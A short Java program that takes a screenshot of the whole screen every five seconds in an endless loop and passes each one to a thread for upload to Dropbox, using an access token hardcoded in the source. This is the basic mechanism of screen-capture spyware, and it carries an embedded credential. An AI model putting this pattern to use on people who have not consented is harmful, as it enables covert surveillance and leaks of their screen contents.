import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.InputStream;

public class Main {
    public static void main(String[] args) throws AWTException {
        String ACCESS_TOKEN = "zp_PHan4408AAAAAAAAAAacNip2DlTZ9MhwzORwxEf4OekygDnYBUYSVscGYydoi";

        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);


        for(;;) {
            Robot robot = new Robot();
            Rectangle area = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage image = robot.createScreenCapture(area);
            MyThread tread = new MyThread(image, client);
            tread.start();
            try {
                tread.sleep(5000);
                System.out.println("upload image");
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }


    }

}

